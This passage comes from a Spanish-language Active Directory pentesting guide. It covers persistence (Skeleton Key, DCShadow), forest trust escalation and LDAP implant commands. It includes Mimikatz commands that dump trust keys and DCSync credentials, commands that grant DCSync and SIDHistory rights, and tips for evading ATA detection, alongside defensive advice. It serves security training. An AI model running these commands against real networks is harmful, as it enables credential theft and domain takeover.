acl-persistence-abuse/
{{#endref}}

### Descriptores de seguridad

Los **security descriptors** se usan para **almacenar** los **permisos** que un **objeto** tiene **sobre** otro **objeto**. Si puedes simplemente **hacer** un **pequeño cambio** en el **security descriptor** de un objeto, puedes obtener privilegios muy interesantes sobre ese objeto sin necesitar ser miembro de un grupo privilegiado.


{{#ref}}
security-descriptors.md
{{#endref}}

### Skeleton Key

Alterar **LSASS** en memoria para establecer una **contraseña universal**, otorgando acceso a todas las cuentas del dominio.


{{#ref}}
skeleton-key.md
{{#endref}}

### Custom SSP

[Learn what is a SSP (Security Support Provider) here.](../authentication-credentials-uac-and-efs/index.html#security-support-provider-interface-sspi)\
Puedes crear tu **propio SSP** para **capturar** en **texto claro** las **credenciales** usadas para acceder a la máquina.


{{#ref}}
custom-ssp.md
{{#endref}}

### DCShadow

Registra un **nuevo Domain Controller** en el AD y lo usa para **empujar atributos** (SIDHistory, SPNs...) sobre objetos especificados **sin** dejar registros acerca de las **modificaciones**. Necesitas privilegios DA y estar dentro del **root domain**.\
Ten en cuenta que si usas datos incorrectos, aparecerán logs bastante feos.


{{#ref}}
dcshadow.md
{{#endref}}

### Persistencia usando LAPS

Anteriormente hemos hablado sobre cómo escalar privilegios si tienes **suficientes permisos para leer contraseñas LAPS**. Sin embargo, estas contraseñas también pueden usarse para **mantener persistencia**.\
Revisa:


{{#ref}}
laps.md
{{#endref}}

## Escalada de privilegios entre Forests - Domain Trusts

Microsoft considera el **Forest** como el límite de seguridad. Esto implica que **comprometer un solo dominio podría potencialmente llevar a comprometer todo el Forest**.

### Información básica

Un [**domain trust**](<http://technet.microsoft.com/en-us/library/cc759554(v=ws.10).aspx>) es un mecanismo de seguridad que permite a un usuario de un **dominio** acceder a recursos en otro **dominio**. Esencialmente crea un enlace entre los sistemas de autenticación de ambos dominios, permitiendo que las verificaciones de autenticación fluyan sin problemas. Cuando los dominios establecen una confianza, intercambian y retienen claves específicas dentro de sus **Domain Controllers (DCs)**, que son cruciales para la integridad de la confianza.

En un escenario típico, si un usuario desea acceder a un servicio en un **dominio confiable**, primero debe solicitar un ticket especial conocido como **inter-realm TGT** desde el DC de su propio dominio. Este TGT está cifrado con una **clave de confianza** que ambos dominios han acordado. Luego el usuario presenta este TGT al **DC del dominio confiable** para obtener un ticket de servicio (**TGS**). Tras la verificación exitosa del inter-realm TGT por parte del DC del dominio confiable, este emite un TGS, otorgando al usuario acceso al servicio.

**Pasos**:

1. Un **equipo cliente** en **Domain 1** inicia el proceso usando su **NTLM hash** para solicitar un **Ticket Granting Ticket (TGT)** a su **Domain Controller (DC1)**.
2. DC1 emite un nuevo TGT si el cliente se autentica satisfactoriamente.
3. El cliente entonces solicita un **inter-realm TGT** a DC1, que se necesita para acceder a recursos en **Domain 2**.
4. El inter-realm TGT se cifra con una **trust key** compartida entre DC1 y DC2 como parte de la confianza bidireccional entre dominios.
5. El cliente lleva el inter-realm TGT al **Domain Controller (DC2)** de **Domain 2**.
6. DC2 verifica el inter-realm TGT usando su trust key compartida y, si es válido, emite un **Ticket Granting Service (TGS)** para el servidor en Domain 2 al que el cliente quiere acceder.
7. Finalmente, el cliente presenta este TGS al servidor, que está cifrado con el hash de la cuenta del servidor, para obtener acceso al servicio en Domain 2.

### Diferentes trusts

Es importante notar que **una trust puede ser de 1 vía o 2 vías**. En la opción de 2 vías, ambos dominios se confiarán mutuamente, pero en la relación de confianza de **1 vía** uno de los dominios será el **trusted** y el otro el **trusting**. En este último caso, **solo podrás acceder a recursos dentro del trusting domain desde el trusted**.

Si Domain A confía en Domain B, A es el trusting domain y B es el trusted. Además, en **Domain A**, esto sería una **Outbound trust**; y en **Domain B**, esto sería una **Inbound trust**.

**Diferentes relaciones de confianza**

- **Parent-Child Trusts**: Es una configuración común dentro del mismo forest, donde un child domain tiene automáticamente una confianza transitiva bidireccional con su parent domain. Esencialmente, esto significa que las solicitudes de autenticación pueden fluir sin problemas entre el parent y el child.
- **Cross-link Trusts**: Denominadas "shortcut trusts", se establecen entre child domains para agilizar los procesos de referral. En forests complejos, las referencias de autenticación típicamente tienen que subir hasta la raíz del forest y luego bajar al dominio objetivo. Al crear cross-links, se acorta ese recorrido, lo cual es especialmente beneficioso en entornos geográficamente dispersos.
- **External Trusts**: Se configuran entre dominios diferentes y no relacionados y son no transitivas por naturaleza. Según la [documentación de Microsoft](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>), las external trusts son útiles para acceder a recursos en un dominio fuera del forest actual que no está conectado por una forest trust. La seguridad se refuerza mediante SID filtering con external trusts.
- **Tree-root Trusts**: Estas trusts se establecen automáticamente entre el forest root domain y una nueva tree root añadida. Aunque no se encuentran comúnmente, las tree-root trusts son importantes para añadir nuevos árboles de dominio a un forest, permitiéndoles mantener un nombre de dominio único y asegurando transitividad bidireccional. Más información puede encontrarse en la [guía de Microsoft](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>).
- **Forest Trusts**: Este tipo de trust es una confianza transitiva bidireccional entre dos forest root domains, también aplicando SID filtering para mejorar las medidas de seguridad.
- **MIT Trusts**: Estas trusts se establecen con dominios Kerberos no-Windows, compatibles con [RFC4120](https://tools.ietf.org/html/rfc4120). Las MIT trusts son un poco más especializadas y atienden a entornos que requieren integración con sistemas basados en Kerberos fuera del ecosistema Windows.

#### Otras diferencias en las relaciones de confianza

- Una relación de trust también puede ser **transitiva** (A confía en B, B confía en C, entonces A confía en C) o **no transitiva**.
- Una relación de trust puede configurarse como **bidireccional** (ambos se confían) o como **one-way trust** (solo uno confía en el otro).

### Camino de ataque

1. **Enumerar** las relaciones de confianza
2. Comprobar si algún **security principal** (user/group/computer) tiene **acceso** a recursos del **otro dominio**, quizá por entradas ACE o por formar parte de grupos del otro dominio. Buscar **relaciones a través de dominios** (probablemente la trust fue creada para esto).
1. kerberoast en este caso podría ser otra opción.
3. **Comprometer** las **cuentas** que pueden **pivotar** entre dominios.

Los atacantes podrían acceder a recursos en otro dominio mediante tres mecanismos principales:

- **Membresía en grupos locales**: Principales pueden ser añadidos a grupos locales en máquinas, como el grupo “Administrators” en un servidor, otorgándoles control significativo sobre esa máquina.
- **Membresía en grupos de un dominio extranjero**: Los principales también pueden ser miembros de grupos dentro del dominio extranjero. Sin embargo, la efectividad de este método depende de la naturaleza de la trust y del alcance del grupo.
- **Access Control Lists (ACLs)**: Los principales pueden estar especificados en una **ACL**, particularmente como entidades en **ACEs** dentro de una **DACL**, proporcionándoles acceso a recursos específicos. Para quienes quieran profundizar en la mecánica de ACLs, DACLs y ACEs, el whitepaper titulado “[An ACE Up The Sleeve](https://specterops.io/assets/resources/an_ace_up_the_sleeve.pdf)” es un recurso invaluable.

### Encontrar usuarios/grupos externos con permisos

Puedes comprobar **`CN=<user_SID>,CN=ForeignSecurityPrincipals,DC=domain,DC=com`** para encontrar foreign security principals en el dominio. Estos serán usuarios/grupos de **un dominio/forest externo**.

Puedes comprobar esto en **Bloodhound** o usando powerview:
```powershell
# Get users that are i groups outside of the current domain
Get-DomainForeignUser

# Get groups inside a domain with users our
Get-DomainForeignGroupMember
```
### Child-to-Parent forest privilege escalation
```bash
# Fro powerview
Get-DomainTrust

SourceName      : sub.domain.local    --> current domain
TargetName      : domain.local        --> foreign domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : WITHIN_FOREST       --> WITHIN_FOREST: Both in the same forest
TrustDirection  : Bidirectional       --> Trust direction (2ways in this case)
WhenCreated     : 2/19/2021 1:28:00 PM
WhenChanged     : 2/19/2021 1:28:00 PM
```
Otras formas de enumerar relaciones de confianza de dominio:
```bash
# Get DCs
nltest /dsgetdc:<DOMAIN>

# Get all domain trusts
nltest /domain_trusts /all_trusts /v

# Get all trust of a domain
nltest /dclist:sub.domain.local
nltest /server:dc.sub.domain.local /domain_trusts /all_trusts
```
> [!WARNING]
> Hay **2 trusted keys**, una para _Child --> Parent_ y otra para _Parent_ --> _Child_.\
> Puedes ver la que usa el dominio actual con:
>
> ```bash
> Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.my.domain.local
> Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\mcorp$"'
> ```

#### SID-History Injection

Escalar a Enterprise admin al dominio child/parent abusando del trust con SID-History injection:


{{#ref}}
sid-history-injection.md
{{#endref}}

#### Exploit writeable Configuration NC

Entender cómo se puede explotar el Configuration Naming Context (NC) es crucial. El Configuration NC funciona como un repositorio central de datos de configuración a través de un forest en entornos Active Directory (AD). Estos datos se replican a cada Domain Controller (DC) dentro del forest, y los DCs con capacidad de escritura mantienen una copia escribible del Configuration NC. Para explotarlo, se deben tener **privilegios SYSTEM en un DC**, preferiblemente un child DC.

**Link GPO to root DC site**

El contenedor Sites del Configuration NC incluye información sobre los sitios de todos los equipos unidos al dominio dentro del AD forest. Al operar con privilegios SYSTEM en cualquier DC, los atacantes pueden linkear GPOs a los sitios root DC. Esta acción puede comprometer potencialmente el dominio root manipulando las políticas aplicadas a esos sitios.

Para información detallada, se puede consultar la investigación sobre [Bypassing SID Filtering](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-4-bypass-sid-filtering-research).

**Compromise any gMSA in the forest**

Un vector de ataque consiste en apuntar a gMSAs privilegiadas dentro del dominio. La KDS Root key, esencial para calcular las contraseñas de los gMSAs, está almacenada dentro del Configuration NC. Con privilegios SYSTEM en cualquier DC, es posible acceder a la KDS Root key y computar las contraseñas de cualquier gMSA en todo el forest.

Un análisis detallado y guía paso a paso puede encontrarse en:


{{#ref}}
golden-dmsa-gmsa.md
{{#endref}}

Ataque complementario delegado a MSA (BadSuccessor – abusando atributos de migración):


{{#ref}}
badsuccessor-dmsa-migration-abuse.md
{{#endref}}

Investigación externa adicional: [Golden gMSA Trust Attacks](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-5-golden-gmsa-trust-attack-from-child-to-parent).

**Schema change attack**

Este método requiere paciencia, esperar a la creación de nuevos objetos AD privilegiados. Con privilegios SYSTEM, un atacante puede modificar el AD Schema para otorgar a cualquier usuario control total sobre todas las clases. Esto podría conducir a acceso no autorizado y control sobre los objetos AD recién creados.

Más información en [Schema Change Trust Attacks](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-6-schema-change-trust-attack-from-child-to-parent).

**From DA to EA with ADCS ESC5**

La vulnerabilidad ADCS ESC5 se dirige al control sobre objetos de Public Key Infrastructure (PKI) para crear una plantilla de certificado que permita autenticarse como cualquier usuario dentro del forest. Como los objetos PKI residen en el Configuration NC, comprometer un child DC escribible permite ejecutar ataques ESC5.

Más detalles pueden leerse en [From DA to EA with ESC5](https://posts.specterops.io/from-da-to-ea-with-esc5-f9f045aa105c). En escenarios sin ADCS, el atacante tiene la capacidad de montar los componentes necesarios, como se discute en [Escalating from Child Domain Admins to Enterprise Admins](https://www.pkisolutions.com/escalating-from-child-domains-admins-to-enterprise-admins-in-5-minutes-by-abusing-ad-cs-a-follow-up/).

### External Forest Domain - One-Way (Inbound) or bidirectional
```bash
Get-DomainTrust
SourceName      : a.domain.local   --> Current domain
TargetName      : domain.external  --> Destination domain
TrustType       : WINDOWS-ACTIVE_DIRECTORY
TrustAttributes :
TrustDirection  : Inbound          --> Inboud trust
WhenCreated     : 2/19/2021 10:50:56 PM
WhenChanged     : 2/19/2021 10:50:56 PM
```
En este escenario **tu dominio es confiado** por uno externo, dándote **permisos indeterminados** sobre él. Deberás averiguar **qué entidades (principals) de tu dominio tienen qué acceso sobre el dominio externo** y luego intentar explotarlo:

{{#ref}}
external-forest-domain-oneway-inbound.md
{{#endref}}

### Dominio de Bosque Externo - Unidireccional (Saliente)
```bash
Get-DomainTrust -Domain current.local

SourceName      : current.local   --> Current domain
TargetName      : external.local  --> Destination domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Outbound        --> Outbound trust
WhenCreated     : 2/19/2021 10:15:24 PM
WhenChanged     : 2/19/2021 10:15:24 PM
```
En este escenario **tu dominio** está **confiando** algunos **privilegios** a un principal de **dominios diferentes**.

Sin embargo, cuando un **dominio es trusted** por el dominio que confía, el dominio trusted **crea un usuario** con un **nombre predecible** que usa como **contraseña la trusted password**. Lo que significa que es posible **acceder con un usuario del dominio que confía para entrar en el dominio trusted** para enumerarlo e intentar escalar más privilegios:


{{#ref}}
external-forest-domain-one-way-outbound.md
{{#endref}}

Otra forma de comprometer el dominio trusted es encontrar un [**SQL trusted link**](abusing-ad-mssql.md#mssql-trusted-links) creado en la **dirección opuesta** de la domain trust (lo cual no es muy común).

Otra forma de comprometer el dominio trusted es quedarse en una máquina a la que un **usuario del dominio trusted puede acceder** para iniciar sesión vía **RDP**. Entonces, el atacante podría inyectar código en el proceso de la sesión RDP y **acceder al dominio de origen de la víctima** desde allí.\
Además, si la **víctima montó su disco duro**, desde el proceso de **RDP session** el atacante podría guardar **backdoors** en la **startup folder del disco duro**. Esta técnica se llama **RDPInception.**


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### Mitigación del abuso de confianza entre dominios

### **SID Filtering:**

- El riesgo de ataques que aprovechan el atributo SID history a través de forest trusts se mitiga mediante SID Filtering, que está activado por defecto en todas las inter-forest trusts. Esto se sustenta en la suposición de que las intra-forest trusts son seguras, considerando al forest, en lugar del domain, como el límite de seguridad según la postura de Microsoft.
- Sin embargo, hay una trampa: SID Filtering puede interrumpir aplicaciones y el acceso de usuarios, lo que lleva a su desactivación ocasional.

### **Selective Authentication:**

- Para trusts entre bosques, emplear Selective Authentication asegura que los usuarios de los dos forests no se autentican automáticamente. En su lugar, se requieren permisos explícitos para que los usuarios accedan a dominios y servidores dentro del dominio o forest que confía.
- Es importante notar que estas medidas no protegen contra la explotación del writable Configuration Naming Context (NC) ni contra ataques a la trust account.

[**More information about domain trusts in ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)

## Abuso de AD basado en LDAP desde implantes on-host

La [LDAP BOF Collection](https://github.com/P0142/LDAP-Bof-Collection) re-implementa primitivas LDAP al estilo bloodyAD como x64 Beacon Object Files que se ejecutan íntegramente dentro de un on-host implant (p. ej., Adaptix C2). Los operadores compilan el paquete con `git clone https://github.com/P0142/ldap-bof-collection.git && cd ldap-bof-collection && make`, cargan `ldap.axs` y luego llaman a `ldap <subcommand>` desde el beacon. Todo el tráfico viaja con el contexto de seguridad del inicio de sesión actual sobre LDAP (389) con signing/sealing o LDAPS (636) con auto certificate trust, por lo que no se requieren socks proxies ni artefactos en disco.

### Enumeración LDAP en el implante

- `get-users`, `get-computers`, `get-groups`, `get-usergroups`, and `get-groupmembers` resuelven nombres cortos/rutas OU en DNs completos y vuelcan los objetos correspondientes.
- `get-object`, `get-attribute`, and `get-domaininfo` extraen atributos arbitrarios (incluidos security descriptors) además de los metadatos de forest/domain desde `rootDSE`.
- `get-uac`, `get-spn`, `get-delegation`, and `get-rbcd` exponen candidatos para roasting, configuraciones de delegación y descriptores existentes de [Resource-based Constrained Delegation](resource-based-constrained-delegation.md) directamente desde LDAP.
- `get-acl` y `get-writable --detailed` analizan la DACL para listar trustees, derechos (GenericAll/WriteDACL/WriteOwner/attribute writes) y herencia, proporcionando objetivos inmediatos para la escalada de privilegios por ACL.
```powershell
ldap get-users --ldaps
ldap get-computers -ou "OU=Servers,DC=corp,DC=local"
ldap get-writable --detailed
ldap get-acl "CN=Tier0,OU=Admins,DC=corp,DC=local"
```
### LDAP write primitives for escalation & persistence

- Object creation BOFs (`add-user`, `add-computer`, `add-group`, `add-ou`) permiten al operador preparar nuevos principals o machine accounts dondequiera que existan derechos sobre la OU. `add-groupmember`, `set-password`, `add-attribute`, y `set-attribute` secuestran directamente los objetivos una vez que se encuentran derechos de write-property.
- Comandos enfocados en ACL como `add-ace`, `set-owner`, `add-genericall`, `add-genericwrite`, y `add-dcsync` traducen WriteDACL/WriteOwner en cualquier objeto AD a resets de contraseña, control de membership en grupos, o privilegios de DCSync replication sin dejar artefactos de PowerShell/ADSI. Las contrapartes `remove-*` limpian los ACEs inyectados.

### Delegation, roasting, and Kerberos abuse

- `add-spn`/`set-spn` hacen instantáneamente a un usuario comprometido Kerberoastable; `add-asreproastable` (toggle de UAC) lo marca para AS-REP roasting sin tocar la contraseña.
- Macros de Delegation (`add-delegation`, `set-delegation`, `add-constrained`, `add-unconstrained`, `add-rbcd`) reescriben `msDS-AllowedToDelegateTo`, flags de UAC, o `msDS-AllowedToActOnBehalfOfOtherIdentity` desde el beacon, habilitando rutas de ataque constrained/unconstrained/RBCD y eliminando la necesidad de PowerShell remoto o RSAT.

### sidHistory injection, OU relocation, and attack surface shaping

- `add-sidhistory` inyecta privileged SIDs en el SID history de un principal controlado (ver [SID-History Injection](sid-history-injection.md)), proporcionando herencia de acceso sigilosa totalmente sobre LDAP/LDAPS.
- `move-object` cambia el DN/OU de computers o users, permitiendo a un atacante arrastrar assets a OUs donde ya existen derechos delegados antes de abusar de `set-password`, `add-groupmember`, o `add-spn`.
- Comandos de eliminación de alcance estrecho (`remove-attribute`, `remove-delegation`, `remove-rbcd`, `remove-uac`, `remove-groupmember`, etc.) permiten un rápido rollback después de que el operador coseche credenciales o persistence, minimizando la telemetría.

## AD -> Azure & Azure -> AD


{{#ref}}
https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/az-lateral-movement-cloud-on-prem/azure-ad-connect-hybrid-identity/index.html
{{#endref}}

## Some General Defenses

[**Learn more about how to protect credentials here.**](../stealing-credentials/credentials-protections.md)

### **Defensive Measures for Credential Protection**

- **Domain Admins Restrictions**: Se recomienda que los Domain Admins solo puedan iniciar sesión en Domain Controllers, evitando su uso en otros hosts.
- **Service Account Privileges**: Los servicios no deberían ejecutarse con privilegios de Domain Admin (DA) para mantener la seguridad.
- **Temporal Privilege Limitation**: Para tareas que requieran privilegios DA, su duración debe ser limitada. Esto puede lograrse con: `Add-ADGroupMember -Identity ‘Domain Admins’ -Members newDA -MemberTimeToLive (New-TimeSpan -Minutes 20)`

### **Implementing Deception Techniques**

- Implementar deception implica colocar trampas, como usuarios o computers señuelo, con características como contraseñas que no expiran o marcados como Trusted for Delegation. Un enfoque detallado incluye crear usuarios con derechos específicos o añadirlos a grupos de alto privilegio.
- Un ejemplo práctico implica usar herramientas como: `Create-DecoyUser -UserFirstName user -UserLastName manager-uncommon -Password Pass@123 | DeployUserDeception -UserFlag PasswordNeverExpires -GUID d07da11f-8a3d-42b6-b0aa-76c962be719a -Verbose`
- Más sobre despliegue de deception techniques puede encontrarse en [Deploy-Deception on GitHub](https://github.com/samratashok/Deploy-Deception).

### **Identifying Deception**

- **For User Objects**: Indicadores sospechosos incluyen ObjectSID atípico, logons poco frecuentes, fechas de creación, y un bajo contador de bad password attempts.
- **General Indicators**: Comparar atributos de posibles objetos señuelo con los de objetos genuinos puede revelar inconsistencias. Herramientas como [HoneypotBuster](https://github.com/JavelinNetworks/HoneypotBuster) pueden ayudar a identificar dichas deceptions.

### **Bypassing Detection Systems**

- **Microsoft ATA Detection Bypass**:
- **User Enumeration**: Evitar la enumeración de sesiones en Domain Controllers para prevenir la detección por ATA.
- **Ticket Impersonation**: Utilizar claves **aes** para la creación de tickets ayuda a evadir la detección al no degradar a NTLM.
- **DCSync Attacks**: Se recomienda ejecutar desde un non-Domain Controller para evitar la detección por ATA, ya que la ejecución directa desde un Domain Controller generará alertas.

## References

- [http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/](http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/)
- [https://www.labofapenetrationtester.com/2018/10/deploy-deception.html](https://www.labofapenetrationtester.com/2018/10/deploy-deception.html)
- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)
- [LDAP BOF Collection – In-Memory LDAP Toolkit for Active Directory Exploitation](https://github.com/P0142/LDAP-Bof-Collection)
- [TrustedSec – Holy Shuck! Weaponizing NTLM Hashes as a Wordlist](https://trustedsec.com/blog/holy-shuck-weaponizing-ntlm-hashes-as-a-wordlist)
- [Hashcat](https://github.com/hashcat/hashcat)

{{#include ../../banners/hacktricks-training.md}}
